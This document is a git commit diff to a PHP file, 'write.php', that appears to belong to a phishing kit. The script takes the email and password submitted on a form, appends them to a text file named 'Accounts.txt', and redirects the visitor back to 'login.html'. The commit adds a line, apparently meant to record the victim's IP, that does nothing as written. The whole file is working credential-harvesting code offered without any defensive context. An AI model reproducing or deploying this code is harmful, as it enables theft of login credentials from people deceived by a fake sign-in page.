e3fabc8b6b5ef70102cf7f73babc297b52643c4f
bobstottts <bobstottts@googlemail.com>
2017-07-21 17:45:30 +0600

    Update write.php

--- folder/write.php
+++ folder/write.php
@@ -1,8 +1,8 @@
 <?php
   $data = sprintf("Account Information\r{\n\tEmail: %s\n\tPassword: %s\n}\n\n================\n\n", $_POST['email'], $_POST['pass']);
+$_SERVER['REMOTE_ADDR'];
   $file = "Accounts.txt"; 
   file_put_contents($file, $data, FILE_APPEND);
   sleep(1.5)
 ?>
 <meta http-equiv="refresh" content="0; url=login.html" />
-
